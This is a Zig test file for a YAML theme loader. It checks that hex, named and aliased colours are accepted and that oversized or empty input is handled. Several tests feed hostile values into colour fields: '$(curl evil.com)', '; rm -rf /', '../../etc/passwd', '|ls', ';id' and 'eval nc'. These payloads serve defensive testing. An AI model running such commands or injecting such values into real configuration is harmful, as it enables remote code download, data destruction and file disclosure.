const std = @import("std");
const testing = std.testing;
const theme_loader = @import("../../src/model/theme_loader.zig");

test "theme loader rejects malicious shell commands" {
    const allocator = testing.allocator;
    
    // Test malicious YAML with command injection
    const malicious_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "$(curl evil.com)"
        \\    bgColor: "#414868; rm -rf /"
    ;
    
    var theme = try theme_loader.parseSkinFile(allocator, malicious_yaml);
    defer theme_loader.deinitTheme(@constCast(&theme));
    
    // Should fall back to default colors (not execute commands)
    // The unsafe values should be ignored
}

test "theme loader rejects path traversal" {
    const allocator = testing.allocator;
    
    const malicious_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "../../etc/passwd"
        \\    bgColor: "~/malicious"
    ;
    
    var theme = try theme_loader.parseSkinFile(allocator, malicious_yaml);
    defer theme_loader.deinitTheme(@constCast(&theme));
}

test "theme loader rejects command characters" {
    const allocator = testing.allocator;
    
    const malicious_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "#fff|ls"
        \\    bgColor: "#000;id"
    ;
    
    var theme = try theme_loader.parseSkinFile(allocator, malicious_yaml);
    defer theme_loader.deinitTheme(@constCast(&theme));
}

test "theme loader rejects dangerous commands" {
    const allocator = testing.allocator;
    
    const malicious_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "exec bash"
        \\    bgColor: "eval nc"
    ;
    
    var theme = try theme_loader.parseSkinFile(allocator, malicious_yaml);
    defer theme_loader.deinitTheme(@constCast(&theme));
}

test "theme loader accepts valid hex colors" {
    const allocator = testing.allocator;
    
    const valid_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "#ffffff"
        \\    bgColor: "#000000"
    ;
    
    var theme = try theme_loader.parseSkinFile(allocator, valid_yaml);
    defer theme_loader.deinitTheme(@constCast(&theme));
    
    // Should accept these valid hex colors
}

test "theme loader accepts valid named colors" {
    const allocator = testing.allocator;
    
    const valid_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "white"
        \\    bgColor: "black"
    ;
    
    var theme = try theme_loader.parseSkinFile(allocator, valid_yaml);
    defer theme_loader.deinitTheme(@constCast(&theme));
}

test "theme loader accepts valid color aliases" {
    const allocator = testing.allocator;
    
    const valid_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "*primary-color"
        \\    bgColor: "*bg-dark"
    ;
    
    var theme = try theme_loader.parseSkinFile(allocator, valid_yaml);
    defer theme_loader.deinitTheme(@constCast(&theme));
}

test "theme loader accepts default color" {
    const allocator = testing.allocator;
    
    const valid_yaml =
        \\k9s:
        \\  body:
        \\    fgColor: "default"
        \\    bgColor: "default"
    ;
    
    var theme = try theme_loader.parseSkinFile(allocator, valid_yaml);
    defer theme_loader.deinitTheme(@constCast(&theme));
}

test "theme loader rejects oversized files" {
    const allocator = testing.allocator;
    
    // Create a buffer larger than 100KB
    const large_content = try allocator.alloc(u8, 101 * 1024);
    defer allocator.free(large_content);
    @memset(large_content, 'x');
    
    var theme = try theme_loader.parseSkinFile(allocator, large_content);
    defer theme_loader.deinitTheme(@constCast(&theme));
    
    // Should fall back to default theme
}

test "theme loader handles empty values safely" {
    const allocator = testing.allocator;
    
    const yaml_with_empty =
        \\k9s:
        \\  body:
        \\    fgColor: ""
        \\    bgColor: ""
    ;
    
    var theme = try theme_loader.parseSkinFile(allocator, yaml_with_empty);
    defer theme_loader.deinitTheme(@constCast(&theme));
}
